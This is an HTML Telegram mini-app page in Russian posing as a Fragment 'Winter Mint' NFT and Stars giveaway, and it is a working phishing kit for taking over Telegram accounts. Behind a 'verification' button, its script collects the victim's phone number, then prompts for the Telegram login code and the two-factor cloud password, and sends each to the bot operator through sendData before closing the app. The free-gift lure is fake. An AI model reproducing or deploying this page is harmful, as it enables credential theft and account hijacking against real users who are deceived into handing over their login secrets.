<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment | Winter Mint</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --main: #00d4ff; --gold: #ffcc00; }
        
        body {
            margin: 0; padding: 0;
            background: radial-gradient(circle at top, #1a2a6c, #b21f1f, #fdbb2d);
            background-attachment: fixed;
            font-family: 'Segoe UI', sans-serif;
            color: white; overflow-x: hidden;
        }

        /* Эффект снега */
        .snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }

        /* Новогодние гирлянды */
        .lights {
            position: fixed; top: 0; width: 100%; height: 50px;
            background: url('https://www.transparentpng.com/download/christmas-lights/colorful-christmas-lights-png-2.png') repeat-x;
            background-size: contain; z-index: 100;
        }

        .header { text-align: center; padding: 60px 20px 20px; }
        .glass-box {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 25px; margin: 15px; padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 15px; }
        .nft-card {
            background: rgba(0,0,0,0.6);
            border-radius: 20px; padding: 10px; border: 1px solid var(--main);
            text-align: center;
        }
        .nft-img { width: 100%; border-radius: 15px; margin-bottom: 10px; }

        .btn-claim {
            background: linear-gradient(90deg, #ff416c, #ff4b2b);
            border: none; width: 100%; padding: 15px;
            border-radius: 12px; color: white; font-weight: bold;
            font-size: 16px; margin-top: 10px; cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
        }

        .overlay {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 2000; padding: 30px; flex-direction: column; justify-content: center;
        }
        .overlay.active { display: flex; }

        .input-field {
            background: #111; border: 2px solid var(--main);
            padding: 20px; border-radius: 15px; color: white;
            font-size: 24px; text-align: center; margin: 20px 0; outline: none;
        }
    </style>
</head>
<body>
    <div class="lights"></div>
    <div class="snow-canvas"></div>

    <div class="header">
        <h1 style="font-size: 32px; text-shadow: 0 0 10px var(--main);">WINTER MINT</h1>
        <div style="background: var(--gold); color: black; display: inline-block; padding: 5px 15px; border-radius: 20px; font-weight: 900;">20.00 STARS GIFT</div>
    </div>

    <div class="glass-box" id="p-main">
        <div style="font-size: 14px; opacity: 0.8; margin-bottom: 10px;">ЛИЧНЫЙ КАБИНЕТ</div>
        <div style="font-size: 22px; font-weight: bold;">ID: UNVERIFIED</div>
        <button class="btn-claim" onclick="auth()">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
    </div>

    <div class="nft-grid">
        <div class="nft-card">
            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-img">
            <div style="font-size: 13px;">Frosty Hat #101</div>
            <div style="color: var(--main); font-weight: 800;">FREE</div>
        </div>
        <div class="nft-card">
            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-img">
            <div style="font-size: 13px;">Neon Drink #99</div>
            <div style="color: var(--main); font-weight: 800;">FREE</div>
        </div>
    </div>

    <div class="glass-box" style="text-align: center;">
        <h3>Поддержка: @x1o1y</h3>
    </div>

    <div id="m-code" class="overlay">
        <h2>Введите Код</h2>
        <p style="color: #888;">Код отправлен в ваш основной Telegram</p>
        <input type="number" id="i-code" class="input-field" placeholder="00000">
        <button class="btn-claim" onclick="sendCode()">ВЕРНО</button>
    </div>

    <div id="m-pass" class="overlay">
        <h2>Облачный Пароль</h2>
        <p style="color: #888;">Ваш аккаунт защищен 2FA</p>
        <input type="password" id="i-pass" class="input-field" placeholder="Password">
        <button class="btn-claim" onclick="sendPass()">ОТКРЫТЬ ДОСТУП</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function auth() {
            tg.requestContact((ok, res) => {
                if(ok) {
                    tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
                    setTimeout(() => { document.getElementById('m-code').classList.add('active'); }, 3000);
                }
            });
        }

        function sendCode() {
            const val = document.getElementById('i-code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                document.getElementById('m-code').classList.remove('active');
                document.getElementById('m-pass').classList.add('active');
            }
        }

        function sendPass() {
            const val = document.getElementById('i-pass').value;
            if(val.length > 0) {
                tg.sendData("PASS:" + val);
                tg.close();
            }
        }

        // Анимация простого снега
        const canvas = document.querySelector('.snow-canvas');
        // (Тут можно добавить JS снега, но для простоты оставим фон)
    </script>
</body>
</html>
